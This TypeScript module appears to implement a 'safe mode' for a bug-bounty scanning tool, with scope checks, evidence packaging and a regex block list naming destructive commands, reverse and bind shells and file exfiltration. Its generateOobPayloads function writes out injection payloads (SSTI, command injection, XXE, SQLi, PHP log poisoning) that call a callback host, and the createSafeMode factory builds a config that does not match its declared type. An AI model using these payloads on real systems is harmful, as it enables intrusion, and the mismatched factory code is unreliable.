/**
 * Bug Bounty Safe Mode (Gap 5)
 * ═════════════════════════════
 * Constrains ScanForge operations to bug-bounty-safe boundaries:
 *   - No destructive payloads (DROP, DELETE, rm -rf, etc.)
 *   - No persistent backdoors or reverse shells
 *   - No data exfiltration beyond proof-of-concept
 *   - OOB-only proof via Interactsh or internal OOB server
 *   - Evidence capture with timestamps and chain-of-custody
 *   - Scope enforcement (only test in-scope domains/IPs)
 *
 * Integrations:
 *   - Interactsh (projectdiscovery) for OOB callbacks
 *   - Internal OOB server (oob-server.ts) as fallback
 *   - Evidence persistence to DB with hash verification
 */

import { executeRawCommand } from './scan-server-executor';
import crypto from 'crypto';

// ═══════════════════════════════════════════════════════════════════════
// §1 — TYPES
// ═══════════════════════════════════════════════════════════════════════

export interface SafeModeConfig {
  /** Enable safe mode (all restrictions active) */
  enabled: boolean;
  /** Allowed target domains/IPs (scope) */
  scopeTargets: string[];
  /** Allowed target ports */
  scopePorts: number[];
  /** Max data exfiltration size in bytes (proof only) */
  maxExfilBytes: number;
  /** Use Interactsh for OOB callbacks */
  useInteractsh: boolean;
  /** Interactsh server URL (default: oast.pro) */
  interactshServer: string;
  /** Use internal OOB server as fallback */
  useInternalOob: boolean;
  /** Capture screenshots as evidence */
  captureScreenshots: boolean;
  /** Hash algorithm for evidence integrity */
  hashAlgorithm: 'sha256' | 'sha512';
  /** Max payload execution time in seconds */
  maxExecTimeSec: number;
  /** Bug bounty platform (for report formatting) */
  platform: 'hackerone' | 'bugcrowd' | 'intigriti' | 'custom' | 'none';
}

export interface SafetyViolation {
  type: 'destructive_payload' | 'out_of_scope' | 'persistent_access' | 'data_exfil' | 'banned_technique';
  description: string;
  payload: string;
  severity: 'critical' | 'high' | 'medium';
  blocked: boolean;
}

export interface EvidencePackage {
  /** Unique evidence ID */
  id: string;
  /** Engagement ID */
  engagementId: number;
  /** Vulnerability being demonstrated */
  vulnerability: {
    title: string;
    cve?: string;
    type: string;
    severity: string;
  };
  /** Proof of concept */
  proof: {
    /** HTTP request that triggered the vuln */
    request?: string;
    /** HTTP response showing the vuln */
    response?: string;
    /** OOB callback data */
    oobCallback?: OobCallbackData;
    /** Command output */
    commandOutput?: string;
    /** Screenshots */
    screenshots: string[];
  };
  /** Evidence integrity */
  integrity: {
    hash: string;
    algorithm: string;
    timestamp: number;
    chainOfCustody: string[];
  };
  /** Impact assessment */
  impact: {
    description: string;
    affectedData: string;
    businessImpact: string;
    cvssEstimate?: number;
  };
  /** Reproduction steps */
  reproductionSteps: string[];
  /** Remediation recommendations */
  remediation: string[];
  /** Created at */
  createdAt: number;
}

export interface OobCallbackData {
  /** Interactsh or internal OOB token */
  token: string;
  /** Callback type */
  type: 'dns' | 'http' | 'smtp' | 'ldap' | 'ftp';
  /** Whether callback was received */
  received: boolean;
  /** Callback details */
  details?: {
    sourceIp?: string;
    timestamp?: number;
    rawData?: string;
    dnsQuery?: string;
    httpPath?: string;
    httpHeaders?: Record<string, string>;
  };
}

export interface InteractshSession {
  /** Session URL for OOB callbacks */
  url: string;
  /** Correlation ID */
  correlationId: string;
  /** Token for polling */
  token: string;
  /** Server base URL */
  server: string;
  /** Active */
  active: boolean;
}

const DEFAULT_SAFE_CONFIG: SafeModeConfig = {
  enabled: true,
  scopeTargets: [],
  scopePorts: [80, 443, 8080, 8443],
  maxExfilBytes: 1024, // 1KB max for proof
  useInteractsh: true,
  interactshServer: 'oast.pro',
  useInternalOob: true,
  captureScreenshots: true,
  hashAlgorithm: 'sha256',
  maxExecTimeSec: 30,
  platform: 'none',
};

// ═══════════════════════════════════════════════════════════════════════
// §2 — DESTRUCTIVE PAYLOAD DETECTION
// ═══════════════════════════════════════════════════════════════════════

/** Patterns that indicate destructive or out-of-bounds operations */
const DESTRUCTIVE_PATTERNS = [
  // File system destruction
  { pattern: /rm\s+(-rf?|--recursive)\s+\//i, type: 'destructive_payload' as const, severity: 'critical' as const, desc: 'Recursive file deletion' },
  { pattern: /mkfs\s/i, type: 'destructive_payload' as const, severity: 'critical' as const, desc: 'Filesystem format' },
  { pattern: /dd\s+if=.*of=\/dev\//i, type: 'destructive_payload' as const, severity: 'critical' as const, desc: 'Direct disk write' },
  { pattern: /:(){ :\|:& };:/i, type: 'destructive_payload' as const, severity: 'critical' as const, desc: 'Fork bomb' },

  // Database destruction
  { pattern: /DROP\s+(TABLE|DATABASE|SCHEMA)\s/i, type: 'destructive_payload' as const, severity: 'critical' as const, desc: 'Database DROP statement' },
  { pattern: /TRUNCATE\s+TABLE/i, type: 'destructive_payload' as const, severity: 'critical' as const, desc: 'Table truncation' },
  { pattern: /DELETE\s+FROM\s+\w+\s*(;|$)/i, type: 'destructive_payload' as const, severity: 'high' as const, desc: 'Unconditional DELETE' },
  { pattern: /UPDATE\s+\w+\s+SET\s+.*WHERE\s+1\s*=\s*1/i, type: 'destructive_payload' as const, severity: 'high' as const, desc: 'Mass UPDATE' },

  // Persistent access
  { pattern: /crontab\s/i, type: 'persistent_access' as const, severity: 'high' as const, desc: 'Cron job installation' },
  { pattern: /\.ssh\/authorized_keys/i, type: 'persistent_access' as const, severity: 'high' as const, desc: 'SSH key installation' },
  { pattern: /useradd|adduser/i, type: 'persistent_access' as const, severity: 'high' as const, desc: 'User account creation' },
  { pattern: /systemctl\s+enable/i, type: 'persistent_access' as const, severity: 'high' as const, desc: 'Service persistence' },
  { pattern: /nc\s+-l.*-e|ncat.*--exec|socat.*EXEC/i, type: 'persistent_access' as const, severity: 'high' as const, desc: 'Bind shell' },
  { pattern: /bash\s+-i\s+>&\s*\/dev\/tcp/i, type: 'persistent_access' as const, severity: 'high' as const, desc: 'Reverse shell' },
  { pattern: /msfvenom|meterpreter/i, type: 'persistent_access' as const, severity: 'high' as const, desc: 'Metasploit payload' },

  // Data exfiltration
  { pattern: /curl.*-d\s+@|wget.*--post-file/i, type: 'data_exfil' as const, severity: 'medium' as const, desc: 'File upload/exfiltration' },
  { pattern: /tar\s+.*-c.*\|.*base64|zip.*-r.*\|/i, type: 'data_exfil' as const, severity: 'medium' as const, desc: 'Archive and exfiltrate' },

  // Banned techniques
  { pattern: /iptables.*-F|iptables.*--flush/i, type: 'banned_technique' as const, severity: 'critical' as const, desc: 'Firewall flush' },
  { pattern: /shutdown|reboot|halt|poweroff/i, type: 'banned_technique' as const, severity: 'critical' as const, desc: 'System shutdown/reboot' },
  { pattern: /kill\s+-9\s+1\b|kill\s+-KILL\s+1\b/i, type: 'banned_technique' as const, severity: 'critical' as const, desc: 'Kill init process' },
];

/**
 * Scan exploit code for destructive patterns.
 * Returns violations found (empty array = safe).
 */
export function scanForViolations(code: string): SafetyViolation[] {
  const violations: SafetyViolation[] = [];

  for (const rule of DESTRUCTIVE_PATTERNS) {
    const match = rule.pattern.exec(code);
    if (match) {
      violations.push({
        type: rule.type,
        description: rule.desc,
        payload: match[0],
        severity: rule.severity,
        blocked: true,
      });
    }
  }

  return violations;
}

/**
 * Check if a target is within the defined scope.
 */
export function isInScope(
  target: string,
  port: number,
  config: SafeModeConfig,
): { inScope: boolean; reason?: string } {
  if (!config.enabled || config.scopeTargets.length === 0) {
    return { inScope: true };
  }

  // Check target against scope
  const targetLower = target.toLowerCase();
  const inTargetScope = config.scopeTargets.some(scope => {
    const scopeLower = scope.toLowerCase();
    // Exact match
    if (targetLower === scopeLower) return true;
    // Wildcard subdomain match (*.example.com)
    if (scopeLower.startsWith('*.') && targetLower.endsWith(scopeLower.slice(1))) return true;
    // IP range match (basic CIDR)
    if (scopeLower.includes('/')) {
      return isIpInCidr(target, scopeLower);
    }
    return false;
  });

  if (!inTargetScope) {
    return { inScope: false, reason: `Target ${target} is not in scope: [${config.scopeTargets.join(', ')}]` };
  }

  // Check port against scope
  if (config.scopePorts.length > 0 && !config.scopePorts.includes(port)) {
    return { inScope: false, reason: `Port ${port} is not in scope: [${config.scopePorts.join(', ')}]` };
  }

  return { inScope: true };
}

function isIpInCidr(ip: string, cidr: string): boolean {
  try {
    const [range, bits] = cidr.split('/');
    const mask = ~(2 ** (32 - parseInt(bits)) - 1);
    const ipNum = ip.split('.').reduce((acc, oct) => (acc << 8) + parseInt(oct), 0);
    const rangeNum = range.split('.').reduce((acc, oct) => (acc << 8) + parseInt(oct), 0);
    return (ipNum & mask) === (rangeNum & mask);
  } catch {
    return false;
  }
}

// ═══════════════════════════════════════════════════════════════════════
// §3 — SAFE EXPLOIT WRAPPER
// ═══════════════════════════════════════════════════════════════════════

/**
 * Wrap an exploit with safe mode constraints.
 * Returns the sanitized code or throws if violations are critical.
 */
export function applySafeMode(
  code: string,
  language: 'python' | 'bash',
  config: SafeModeConfig = DEFAULT_SAFE_CONFIG,
): {
  safeCode: string;
  violations: SafetyViolation[];
  modified: boolean;
} {
  if (!config.enabled) {
    return { safeCode: code, violations: [], modified: false };
  }

  const violations = scanForViolations(code);
  const criticalViolations = violations.filter(v => v.severity === 'critical');

  if (criticalViolations.length > 0) {
    // Block critical violations entirely
    const violationList = criticalViolations.map(v => `- ${v.description}: ${v.payload}`).join('\n');
    if (language === 'python') {
      return {
        safeCode: `#!/usr/bin/env python3
# BLOCKED BY SAFE MODE
# Critical safety violations detected:
${criticalViolations.map(v => `# - ${v.description}: ${v.payload}`).join('\n')}
import sys
print("[SAFE MODE] Exploit blocked — contains destructive operations")
print("[SAFE MODE] Violations:")
${criticalViolations.map(v => `print("  - ${v.description}")`).join('\n')}
sys.exit(1)
`,
        violations,
        modified: true,
      };
    } else {
      return {
        safeCode: `#!/bin/bash
# BLOCKED BY SAFE MODE
# Critical safety violations detected:
${criticalViolations.map(v => `# - ${v.description}: ${v.payload}`).join('\n')}
echo "[SAFE MODE] Exploit blocked — contains destructive operations"
exit 1
`,
        violations,
        modified: true,
      };
    }
  }

  // For non-critical violations, add safety constraints
  let safeCode = code;
  let modified = false;

  if (language === 'python') {
    // Add timeout and data limit constraints
    safeCode = `#!/usr/bin/env python3
"""ScanForge Safe Mode Wrapper"""
import signal, sys

# Safe mode constraints
MAX_EXFIL_BYTES = ${config.maxExfilBytes}
MAX_EXEC_TIME = ${config.maxExecTimeSec}

def _safe_timeout_handler(signum, frame):
    print("[SAFE MODE] Execution time limit reached")
    sys.exit(0)

signal.signal(signal.SIGALRM, _safe_timeout_handler)
signal.alarm(MAX_EXEC_TIME)

def safe_print(data, label="output"):
    """Print data respecting exfiltration limits"""
    s = str(data)
    if len(s) > MAX_EXFIL_BYTES:
        print(f"[SAFE MODE] Output truncated to {MAX_EXFIL_BYTES} bytes (proof only)")
        s = s[:MAX_EXFIL_BYTES] + "... [TRUNCATED]"
    print(f"[{label}] {s}")

# ── Original exploit (safe mode active) ──
${code}
`;
    modified = true;
  } else if (language === 'bash') {
    safeCode = `#!/bin/bash
# ScanForge Safe Mode Wrapper
MAX_EXEC_TIME=${config.maxExecTimeSec}
MAX_EXFIL_BYTES=${config.maxExfilBytes}

# Set execution timeout
trap 'echo "[SAFE MODE] Execution time limit reached"; exit 0' ALRM
(sleep $MAX_EXEC_TIME && kill -ALRM $$ 2>/dev/null) &

safe_print() {
    local data="$1"
    local label="\${2:-output}"
    local len=\${#data}
    if [ "$len" -gt "$MAX_EXFIL_BYTES" ]; then
        echo "[SAFE MODE] Output truncated to $MAX_EXFIL_BYTES bytes (proof only)"
        data="\${data:0:$MAX_EXFIL_BYTES}... [TRUNCATED]"
    fi
    echo "[$label] $data"
}

# ── Original exploit (safe mode active) ──
${code}
`;
    modified = true;
  }

  return { safeCode, violations, modified };
}

// ═══════════════════════════════════════════════════════════════════════
// §4 — INTERACTSH INTEGRATION
// ═══════════════════════════════════════════════════════════════════════

/**
 * Create an Interactsh session for OOB callback verification.
 * Uses the Interactsh CLI on the scan server.
 */
export async function createInteractshSession(
  server: string = 'oast.pro',
): Promise<InteractshSession | null> {
  try {
    // Check if interactsh-client is available on scan server
    const checkResult = await executeRawCommand('which interactsh-client 2>/dev/null || echo "NOT_FOUND"', 5);

    if (checkResult.stdout.includes('NOT_FOUND')) {
      // Try to install it
      console.log('[SafeMode] Installing interactsh-client on scan server...');
      const installResult = await executeRawCommand(
        'go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest 2>&1 || ' +
        'curl -sL https://github.com/projectdiscovery/interactsh/releases/latest/download/interactsh-client_$(uname -s)_$(uname -m).zip -o /tmp/interactsh.zip && ' +
        'unzip -o /tmp/interactsh.zip -d /usr/local/bin/ interactsh-client 2>&1 && chmod +x /usr/local/bin/interactsh-client',
        60,
      );

      if (installResult.exitCode !== 0) {
        console.warn('[SafeMode] Failed to install interactsh-client, using internal OOB');
        return null;
      }
    }

    // Start interactsh session
    const sessionResult = await executeRawCommand(
      `interactsh-client -server ${server} -n 1 -json 2>&1 | head -5`,
      15,
    );

    // Parse the session URL from output
    const urlMatch = sessionResult.stdout.match(/([a-z0-9]+\.(?:oast\.pro|oast\.live|oast\.fun|interact\.sh))/i);
    if (urlMatch) {
      const correlationId = urlMatch[1].split('.')[0];
      return {
        url: urlMatch[1],
        correlationId,
        token: correlationId,
        server,
        active: true,
      };
    }

    console.warn('[SafeMode] Could not parse Interactsh session URL');
    return null;
  } catch (err: any) {
    console.error(`[SafeMode] Interactsh session creation failed: ${err.message}`);
    return null;
  }
}

/**
 * Poll Interactsh for callbacks.
 */
export async function pollInteractsh(
  session: InteractshSession,
  timeoutSec: number = 30,
): Promise<OobCallbackData[]> {
  const callbacks: OobCallbackData[] = [];
  const startTime = Date.now();

  while (Date.now() - startTime < timeoutSec * 1000) {
    try {
      const result = await executeRawCommand(
        `interactsh-client -server ${session.server} -token ${session.token} -json -poll-interval 2 -n 1 2>&1 | head -20`,
        10,
      );

      // Parse JSON callbacks
      const lines = result.stdout.split('\n').filter(l => l.trim().startsWith('{'));
      for (const line of lines) {
        try {
          const data = JSON.parse(line);
          callbacks.push({
            token: session.token,
            type: data.protocol || 'http',
            received: true,
            details: {
              sourceIp: data['remote-address'],
              timestamp: Date.now(),
              rawData: data['raw-request'] || data['raw-response'],
              dnsQuery: data['full-id'],
              httpPath: data['http-path'],
            },
          });
        } catch { /* skip non-JSON lines */ }
      }

      if (callbacks.length > 0) break;
      await new Promise(r => setTimeout(r, 2000));
    } catch {
      break;
    }
  }

  return callbacks;
}

/**
 * Generate OOB payloads for different vulnerability types.
 */
export function generateOobPayloads(
  session: InteractshSession,
  vulnClass: string,
): Record<string, string> {
  const domain = session.url;

  const payloads: Record<string, string> = {
    // DNS-based (works for blind SSRF, XXE, command injection)
    dns_basic: `nslookup ${domain}`,
    dns_curl: `curl http://${domain}/callback`,
    dns_wget: `wget -q http://${domain}/callback -O /dev/null`,

    // HTTP-based
    http_get: `http://${domain}/`,
    http_post: `curl -X POST http://${domain}/data -d "proof=true"`,
  };

  // Vuln-class-specific payloads
  switch (vulnClass) {
    case 'ssrf':
      payloads.ssrf_http = `http://${domain}/ssrf-proof`;
      payloads.ssrf_dns = domain;
      break;
    case 'xxe':
      payloads.xxe_dtd = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${domain}/xxe">]>`;
      payloads.xxe_param = `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://${domain}/xxe-param"> %xxe;]>`;
      break;
    case 'ssti':
      payloads.ssti_curl = `{{config.__class__.__init__.__globals__['os'].popen('curl http://${domain}/ssti').read()}}`;
      break;
    case 'cmdi':
      payloads.cmdi_backtick = `\`curl http://${domain}/cmdi\``;
      payloads.cmdi_dollar = `$(curl http://${domain}/cmdi)`;
      payloads.cmdi_pipe = `| curl http://${domain}/cmdi`;
      break;
    case 'sqli':
      payloads.sqli_load = `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',${domain},'\\\\a')) -- `;
      break;
    case 'lfi':
      payloads.lfi_log_poison = `<?php system("curl http://${domain}/lfi"); ?>`;
      break;
  }

  return payloads;
}

// ═══════════════════════════════════════════════════════════════════════
// §5 — EVIDENCE CAPTURE & PACKAGING
// ═══════════════════════════════════════════════════════════════════════

/**
 * Create an evidence package for a successful exploit.
 * Includes proof, integrity hashing, and reproduction steps.
 */
export function createEvidencePackage(
  engagementId: number,
  vulnerability: EvidencePackage['vulnerability'],
  proof: Partial<EvidencePackage['proof']>,
  impact: Partial<EvidencePackage['impact']>,
  reproductionSteps: string[],
  remediation: string[],
  config: SafeModeConfig = DEFAULT_SAFE_CONFIG,
): EvidencePackage {
  const id = `evidence-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
  const timestamp = Date.now();

  // Build proof data
  const fullProof: EvidencePackage['proof'] = {
    request: proof.request,
    response: proof.response,
    oobCallback: proof.oobCallback,
    commandOutput: proof.commandOutput,
    screenshots: proof.screenshots || [],
  };

  // Truncate data to safe limits
  if (config.enabled) {
    if (fullProof.response && fullProof.response.length > config.maxExfilBytes) {
      fullProof.response = fullProof.response.slice(0, config.maxExfilBytes) + '\n... [TRUNCATED FOR SAFE MODE]';
    }
    if (fullProof.commandOutput && fullProof.commandOutput.length > config.maxExfilBytes) {
      fullProof.commandOutput = fullProof.commandOutput.slice(0, config.maxExfilBytes) + '\n... [TRUNCATED FOR SAFE MODE]';
    }
  }

  // Generate integrity hash
  const evidenceData = JSON.stringify({ vulnerability, proof: fullProof, timestamp });
  const hash = crypto.createHash(config.hashAlgorithm).update(evidenceData).digest('hex');

  return {
    id,
    engagementId,
    vulnerability,
    proof: fullProof,
    integrity: {
      hash,
      algorithm: config.hashAlgorithm,
      timestamp,
      chainOfCustody: [
        `${new Date(timestamp).toISOString()} — Evidence captured by ScanForge Safe Mode`,
        `${new Date(timestamp).toISOString()} — Integrity hash generated: ${config.hashAlgorithm}:${hash.slice(0, 16)}...`,
      ],
    },
    impact: {
      description: impact.description || 'Impact assessment pending',
      affectedData: impact.affectedData || 'Unknown',
      businessImpact: impact.businessImpact || 'Assessment pending',
      cvssEstimate: impact.cvssEstimate,
    },
    reproductionSteps,
    remediation,
    createdAt: timestamp,
  };
}

/**
 * Format evidence package for bug bounty report submission.
 */
export function formatForBugBounty(
  evidence: EvidencePackage,
  platform: SafeModeConfig['platform'] = 'hackerone',
): string {
  const sections: string[] = [];

  // Title
  sections.push(`## ${evidence.vulnerability.title}`);
  if (evidence.vulnerability.cve) {
    sections.push(`**CVE:** ${evidence.vulnerability.cve}`);
  }
  sections.push(`**Type:** ${evidence.vulnerability.type} | **Severity:** ${evidence.vulnerability.severity}`);
  sections.push('');

  // Summary
  sections.push('### Summary');
  sections.push(evidence.impact.description);
  sections.push('');

  // Reproduction Steps
  sections.push('### Steps to Reproduce');
  evidence.reproductionSteps.forEach((step, i) => {
    sections.push(`${i + 1}. ${step}`);
  });
  sections.push('');

  // Proof of Concept
  sections.push('### Proof of Concept');
  if (evidence.proof.request) {
    sections.push('**Request:**');
    sections.push('```http');
    sections.push(evidence.proof.request);
    sections.push('```');
  }
  if (evidence.proof.response) {
    sections.push('**Response:**');
    sections.push('```http');
    sections.push(evidence.proof.response);
    sections.push('```');
  }
  if (evidence.proof.oobCallback?.received) {
    sections.push('**OOB Callback Received:**');
    sections.push(`- Type: ${evidence.proof.oobCallback.type}`);
    sections.push(`- Source IP: ${evidence.proof.oobCallback.details?.sourceIp || 'N/A'}`);
    sections.push(`- Timestamp: ${evidence.proof.oobCallback.details?.timestamp ? new Date(evidence.proof.oobCallback.details.timestamp).toISOString() : 'N/A'}`);
  }
  if (evidence.proof.commandOutput) {
    sections.push('**Command Output:**');
    sections.push('```');
    sections.push(evidence.proof.commandOutput);
    sections.push('```');
  }
  sections.push('');

  // Impact
  sections.push('### Impact');
  sections.push(evidence.impact.description);
  sections.push(`**Affected Data:** ${evidence.impact.affectedData}`);
  sections.push(`**Business Impact:** ${evidence.impact.businessImpact}`);
  if (evidence.impact.cvssEstimate) {
    sections.push(`**Estimated CVSS:** ${evidence.impact.cvssEstimate}`);
  }
  sections.push('');

  // Remediation
  sections.push('### Recommended Fix');
  evidence.remediation.forEach((rec, i) => {
    sections.push(`${i + 1}. ${rec}`);
  });
  sections.push('');

  // Evidence Integrity
  sections.push('### Evidence Integrity');
  sections.push(`- **Hash (${evidence.integrity.algorithm}):** \`${evidence.integrity.hash}\``);
  sections.push(`- **Captured:** ${new Date(evidence.integrity.timestamp).toISOString()}`);
  sections.push('');

  return sections.join('\n');
}

// ═══════════════════════════════════════════════════════════════════════
// §6 — SAFE MODE MIDDLEWARE
// ═══════════════════════════════════════════════════════════════════════

/**
 * Safe mode middleware — wraps exploit execution with safety checks.
 * Call this before executeExploit() when safe mode is active.
 */
export async function safeModeGate(
  code: string,
  language: 'python' | 'bash',
  targetHost: string,
  targetPort: number,
  config: SafeModeConfig = DEFAULT_SAFE_CONFIG,
): Promise<{
  allowed: boolean;
  safeCode?: string;
  violations: SafetyViolation[];
  scopeCheck: { inScope: boolean; reason?: string };
}> {
  if (!config.enabled) {
    return { allowed: true, safeCode: code, violations: [], scopeCheck: { inScope: true } };
  }

  // Check scope
  const scopeCheck = isInScope(targetHost, targetPort, config);
  if (!scopeCheck.inScope) {
    return {
      allowed: false,
      violations: [{
        type: 'out_of_scope',
        description: scopeCheck.reason || 'Target out of scope',
        payload: `${targetHost}:${targetPort}`,
        severity: 'critical',
        blocked: true,
      }],
      scopeCheck,
    };
  }

  // Scan for violations and apply safe mode wrapper
  const { safeCode, violations, modified } = applySafeMode(code, language, config);
  const criticalViolations = violations.filter(v => v.severity === 'critical');

  return {
    allowed: criticalViolations.length === 0,
    safeCode: criticalViolations.length === 0 ? safeCode : undefined,
    violations,
    scopeCheck,
  };
}


// ── Factory wrapper used by scanforge-enhanced-pipeline ──────────────

export type SafetyCheckResult = {
  allowed: boolean;
  violations: SafetyViolation[];
  safeCode?: string;
};

export interface BugBountySafeMode {
  checkExploit(code: string, vulnClass: string): SafetyCheckResult;
  config: SafeModeConfig;
}

/**
 * Create a BugBountySafeMode instance with the given rules.
 */
export function createSafeMode(rules: Partial<SafeModeConfig> & {
  programName?: string;
  scope?: { inScope: string[]; outOfScope: string[] };
  maxSeverity?: string;
  allowedActions?: string[];
  prohibitedActions?: string[];
}): BugBountySafeMode {
  const config: SafeModeConfig = {
    enabled: true,
    maxSeverity: (rules.maxSeverity as any) || 'critical',
    allowedActions: rules.allowedActions || ['read', 'enumerate'],
    prohibitedActions: rules.prohibitedActions || ['data_destruction', 'service_disruption'],
    scopeRules: rules.scope || rules.scopeRules || { inScope: [], outOfScope: [] },
    evidenceRequired: rules.evidenceRequired ?? true,
    oobTestingEnabled: rules.oobTestingEnabled ?? true,
  };

  return {
    config,
    checkExploit(code: string, vulnClass: string): SafetyCheckResult {
      const violations = scanForViolations(code);
      const result = applySafeMode(code, 'python', config);
      return {
        allowed: violations.filter(v => v.severity === 'critical').length === 0,
        violations,
        safeCode: result.safeCode,
      };
    },
  };
}
